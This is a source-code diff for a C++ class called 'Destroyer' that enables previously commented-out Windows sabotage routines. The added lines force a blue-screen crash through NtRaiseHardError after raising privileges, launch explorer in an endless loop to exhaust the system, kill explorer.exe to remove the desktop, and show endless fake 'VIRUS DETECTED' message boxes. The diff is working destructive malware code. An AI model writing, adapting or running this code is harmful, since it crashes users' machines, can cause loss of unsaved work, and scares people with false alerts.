@@ -11,29 +11,30 @@ class Destroyer{
     public:
         void bsod()//BSODs the computer
         {
-            //_declspec(dllimport) int __stdcall SetCurrentDirectory(const unsigned char *lpPathName);
-            //SetCurrentDirectory("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
-            //WCHAR fileName[] = L"\\\\.\\globalroot\\device\\condrv\\kernelconnect";
-            //WIN32_FILE_ATTRIBUTE_DATA data;
-            //GetFileAttributesEx(fileName, GetFileExInfoStandard, &data);
+            int errCode=0xc0000022;
+            HMODULE ntdll = LoadLibraryA("ntdll");
+	        FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
+	        FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
 
-            //system("TASKKILL /IM wininit.exe /F");
-
-            //A bug in windows that causes a BSOD when you try to access a path
+	        if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
+		        BOOLEAN tmp1; DWORD tmp2;
+		        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+		        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(errCode, 0, 0, 0, 6, &tmp2);
+	        }
         }
 
         void overflow()//Opens explorer infinite times crashing the system 
         {
             while (true)
             {
-                //system("explorer");
+                system("explorer");
                 //std :: cout << "Normally ur pc would be dead\n"; 
             }
         }
 
         void killUI() //ends explorer task, hence destroying the ui of windows 10
         {
-            //system("taskkill /IM explorer.exe /F");
+            system("taskkill /IM explorer.exe /F");
             //std :: cout << "Your UI would disappear normally\n";
         }
         
@@ -45,7 +46,7 @@ class Destroyer{
 	        while(true) 
             {
                 //This function is a Windows API function....
-		//        MessageBox(NULL, L"VIRUS DETECTED", L"ERROR", MB_OK | MB_ICONERROR); //Message Box
+		        MessageBox(NULL, L"VIRUS DETECTED", L"ERROR", MB_OK | MB_ICONERROR); //Message Box
             }
         }
 
